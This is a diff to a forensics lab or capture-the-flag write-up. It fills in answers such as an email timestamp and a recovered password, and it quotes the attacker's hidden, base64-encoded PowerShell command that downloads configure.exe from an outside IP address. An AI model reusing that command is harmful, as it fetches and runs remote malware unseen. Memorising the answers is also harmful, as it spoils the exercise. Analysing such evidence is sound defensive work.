@@ -189,7 +189,7 @@ PS C:\Users\Administrator> Get-ScheduledTask | Where-Object {$_.Date —ne $null
 <p><em>Answer the questions below</em></p>
 
 <p>2.1. <em>When did the attacker send the malicious email? (format: MM/DD/YYYY HH:MM:SS)</em><br>
-<code>_____</code></p>
+<code>03/24/2024 19:06:27</code></p>
 
 ![image](https://github.com/user-attachments/assets/ea7596dd-19b5-494c-94ae-f2f718a7fd29)
 
@@ -230,11 +230,33 @@ PS C:\Users> ls C:\Users\ ls C:\Users\m.anderson\AppData\Local\Microsoft\Outlook
 ![image](https://github.com/user-attachments/assets/25a785b1-03b0-4de3-9fc8-813a25e97143)
 
 
+<br>
 
+<h3>XstReader</h3>
 
+![image](https://github.com/user-attachments/assets/5a1fd333-9b64-453e-9890-d650c3dbb0a5)
+
+<br>
 
 <p>2.2. <em>When did the victim open the malicious payload? (format: MM/DD/YYYY HH:MM:SS)</em><br>
 <code>_____</code></p>
+
+![image](https://github.com/user-attachments/assets/b6d87c08-4144-4018-858b-4d98a3825795)
+
+MAnderson03252024!
+
+![image](https://github.com/user-attachments/assets/fc250db5-4f02-4068-a36a-0a635581879d)
+
+![image](https://github.com/user-attachments/assets/850a48e3-81a8-415b-842e-214a35caf57a)
+
+
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAMgA4AC4AMQA5ADkALgAyADQANwAuADEANwAzAC8AYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgACQAZQBuAHYAOgBhAHAAcAB
+```
+
+
+
 
 <br>
 
